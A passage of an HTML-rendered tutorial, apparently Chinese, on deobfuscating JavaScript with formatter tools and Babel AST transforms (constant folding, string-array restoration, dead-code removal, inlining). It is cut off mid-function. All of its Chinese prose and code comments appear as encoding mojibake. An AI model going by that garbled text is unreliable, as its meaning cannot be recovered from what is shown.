<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span><span class="w"> </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;B&#39;</span><span class="p">);</span><span class="w"> </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="mf">2</span><span class="o">:</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="4-æ­»ä»£ç æ³¨å…¥">4. æ­»ä»£ç æ³¨å…¥</h3>

      <p><strong>ç‰¹å¾</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">real</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">fake1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">123</span><span class="p">;</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="cm">/* æ°¸è¿œä¸ä¼šæ‰§è¡Œçš„ä»£ç  */</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s1">&#39;real&#39;</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="åœ¨çº¿å·¥å…·">åœ¨çº¿å·¥å…·</h2>

      <h3 id="1-prettier">1. Prettier</h3>

      <p><strong>ç”¨é€”</strong>: æ ¼å¼åŒ–å‹ç¼©çš„ä»£ç </p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># å®‰è£…</span>
npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>prettier

<span class="c1"># æ ¼å¼åŒ–</span>
prettier<span class="w"> </span>--write<span class="w"> </span>obfuscated.js
</code></pre>
      </div>

      <p><strong>åœ¨çº¿ç‰ˆ</strong>: https://prettier.io/playground/</p>

      <h3 id="2-js-beautify">2. JS-Beautify</h3>

      <p><strong>ç”¨é€”</strong>: ç¾åŒ– JavaScript ä»£ç </p>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>js-beautify
js-beautify<span class="w"> </span>obfuscated.js<span class="w"> </span>&gt;<span class="w"> </span>formatted.js
</code></pre>
      </div>

      <p><strong>åœ¨çº¿ç‰ˆ</strong>: https://beautifier.io/</p>

      <h3 id="3-de4js">3. de4js</h3>

      <p><strong>ç”¨é€”</strong>: ç»¼åˆåæ··æ·†å·¥å…·</p>

      <p><strong>åœ¨çº¿ç‰ˆ</strong>: https://lelinhtinh.github.io/de4js/</p>

      <p>æ”¯æŒ:</p>

      <ul>
        <li>JSFuck</li>
        <li>JJencode</li>
        <li>AAencode</li>
        <li>URLencode</li>
        <li>Packer</li>
        <li>JavaScript Obfuscator</li>
      </ul>

      <hr />

      <h2 id="ast-åæ··æ·†è„šæœ¬">AST åæ··æ·†è„šæœ¬</h2>

      <h3 id="åŸºç¡€æ¡†æ¶">åŸºç¡€æ¡†æ¶</h3>

      <p>ä½¿ç”¨ Babel è§£æå’Œè½¬æ¢ ASTï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/parser&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/traverse&quot;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">generator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/generator&quot;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/types&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;fs&quot;</span><span class="p">);</span>

<span class="c1">// 1. è¯»å–æ··æ·†ä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">&quot;obfuscated.js&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;utf-8&quot;</span><span class="p">);</span>

<span class="c1">// 2. è§£æä¸º AST</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">ast</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="c1">// 3. éå†å’Œè½¬æ¢</span>
<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// åœ¨è¿™é‡Œæ·»åŠ è½¬æ¢è§„åˆ™</span>
<span class="p">});</span>

<span class="c1">// 4. ç”Ÿæˆä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generator</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{},</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s2">&quot;deobfuscated.js&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="è„šæœ¬-1-å¸¸é‡æŠ˜å ">è„šæœ¬ 1: å¸¸é‡æŠ˜å </h3>

      <p><strong>ç›®æ ‡</strong>: è®¡ç®—å¸¸é‡è¡¨è¾¾å¼</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">BinaryExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// å¦‚æœä¸¤ä¸ªæ“ä½œæ•°éƒ½æ˜¯å­—é¢é‡</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">left</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">isLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">right</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// è®¡ç®—ç»“æœ</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
<span class="w">            </span><span class="c1">// æ›¿æ¢ä¸ºç»“æœ</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">valueToNode</span><span class="p">(</span><span class="nx">result</span><span class="p">));</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Before</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>

<span class="c1">// After</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">3</span><span class="p">;</span>
</code></pre>
      </div>

      <h3 id="è„šæœ¬-2-å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ">è„šæœ¬ 2: å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ</h3>

      <p><strong>ç›®æ ‡</strong>: è¿˜åŸå­—ç¬¦ä¸²æ•°ç»„å¼•ç”¨</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">let</span><span class="w"> </span><span class="nx">stringArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ç¬¬ä¸€æ­¥ï¼šæ‰¾åˆ°å­—ç¬¦ä¸²æ•°ç»„</span>
<span class="w">    </span><span class="nx">VariableDeclarator</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isArrayExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
<span class="w">            </span><span class="nx">stringArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">.</span><span class="nx">elements</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">e</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="c1">// ç¬¬äºŒæ­¥ï¼šæ›¿æ¢æ•°ç»„è®¿é—®</span>
<span class="w">    </span><span class="nx">MemberExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// _0x1234[0] =&gt; stringArray[0]</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isIdentifier</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">object</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">            </span><span class="nx">t</span><span class="p">.</span><span class="nx">isNumericLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">stringArray</span><span class="p">[</span><span class="nx">index</span><span class="p">];</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">value</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="kc">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">stringLiteral</span><span class="p">(</span><span class="nx">value</span><span class="p">));</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Before</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0x1234</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;log&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Hello&#39;</span><span class="p">];</span>
<span class="nx">console</span><span class="p">[</span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">0</span><span class="p">]](</span><span class="nx">_0x1234</span><span class="p">[</span><span class="mf">1</span><span class="p">]);</span>

<span class="c1">// After</span>
<span class="nx">console</span><span class="p">[</span><span class="s1">&#39;log&#39;</span><span class="p">](</span><span class="s1">&#39;Hello&#39;</span><span class="p">);</span>
<span class="c1">// åç»­è¿˜å¯ä»¥ç»§ç»­ä¼˜åŒ–ä¸º: console.log(&#39;Hello&#39;);</span>
</code></pre>
      </div>

      <h3 id="è„šæœ¬-3-è®¡ç®—æˆå‘˜è¡¨è¾¾å¼">è„šæœ¬ 3: è®¡ç®—æˆå‘˜è¡¨è¾¾å¼</h3>

      <p><strong>ç›®æ ‡</strong>: <code>obj['prop']</code> â†’ <code>obj.prop</code></p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">MemberExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// å¦‚æœæ˜¯ obj[&#39;prop&#39;] å½¢å¼</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">computed</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">isStringLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">propName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">            </span><span class="c1">// æ£€æŸ¥æ˜¯å¦æ˜¯åˆæ³•æ ‡è¯†ç¬¦</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sr">/^[a-zA-Z_$][a-zA-Z0-9_$]*$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">propName</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">computed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">identifier</span><span class="p">(</span><span class="nx">propName</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Before</span>
<span class="nx">console</span><span class="p">[</span><span class="s1">&#39;log&#39;</span><span class="p">](</span><span class="s1">&#39;Hello&#39;</span><span class="p">);</span>

<span class="c1">// After</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="è„šæœ¬-4-åˆ é™¤æ­»ä»£ç ">è„šæœ¬ 4: åˆ é™¤æ­»ä»£ç </h3>

      <p><strong>ç›®æ ‡</strong>: åˆ é™¤ <code>if (false)</code> ç­‰æ­»ä»£ç </p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">IfStatement</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// å¦‚æœæ¡ä»¶æ˜¯ false</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isBooleanLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">test</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// åˆ é™¤æ•´ä¸ª if è¯­å¥</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="c1">// å¦‚æœæ¡ä»¶æ˜¯ true</span>
<span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isBooleanLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">test</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="c1">// ç”¨ consequent æ›¿æ¢æ•´ä¸ª if</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWithMultiple</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">consequent</span><span class="p">.</span><span class="nx">body</span><span class="p">);</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="è„šæœ¬-5-å‡½æ•°å†…è”">è„šæœ¬ 5: å‡½æ•°å†…è”</h3>

      <p><strong>ç›®æ ‡</strong>: å†…è”ç®€å•çš„åŒ…è£…å‡½æ•°</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">functionMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>

<span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æ”¶é›†å‡½æ•°å®šä¹‰</span>
<span class="w">    </span><span class="nx">FunctionDeclaration</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
<span class="w">        </span><span class="c1">// åªå¤„ç†ç®€å•çš„è¿”å›è¯­å¥å‡½æ•°</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">            </span><span class="nx">t</span><span class="p">.</span><span class="nx">isReturnStatement</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">body</span><span class="p">[</span><span class="mf">0</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">functionMap</span><span class="p">[</span><span class="nx">name</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">body</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">argument</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">},</span>

<span class="w">    </span><span class="c1">// æ›¿æ¢å‡½æ•°è°ƒç”¨</span>
<span class="w">    </span><span class="nx">CallExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isIdentifier</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">callee</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">functionMap</span><span class="p">[</span><span class="nx">name</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="c1">// æ›¿æ¢ä¸ºå‡½æ•°ä½“</span>
<span class="w">                </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">functionMap</span><span class="p">[</span><span class="nx">name</span><span class="p">]);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="å®Œæ•´åæ··æ·†æµç¨‹">å®Œæ•´åæ··æ·†æµç¨‹</h2>

      <h3 id="è‡ªåŠ¨åŒ–è„šæœ¬">è‡ªåŠ¨åŒ–è„šæœ¬</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;fs&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/parser&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/traverse&quot;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">generator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/generator&quot;</span><span class="p">).</span><span class="k">default</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;@babel/types&quot;</span><span class="p">);</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">deobfuscate</span><span class="p">(</span><span class="nx">inputFile</span><span class="p">,</span><span class="w"> </span><span class="nx">outputFile</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[1/5] è¯»å–æ–‡ä»¶: </span><span class="si">${</span><span class="nx">inputFile</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">inputFile</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;utf-8&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[2/5] è§£æ AST&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ast</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">parser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[3/5] å¸¸é‡æŠ˜å &quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">constantFolding</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[4/5] å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">restoreStringArray</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>

<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[5/5] æ¸…ç†å’Œæ ¼å¼åŒ–&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">cleanup</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generator</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">comments</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="nx">outputFile</span><span class="p">,</span><span class="w"> </span><span class="nx">output</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`âœ… å®Œæˆ! è¾“å‡ºåˆ°: </span><span class="si">${</span><span class="nx">outputFile</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">constantFolding</span><span class="p">(</span><span class="nx">ast</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">BinaryExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">isConstantExpression</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">();</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">confident</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">valueToNode</span><span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">value</span><span class="p">));</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">restoreStringArray</span><span class="p">(</span><span class="nx">ast</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">stringArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
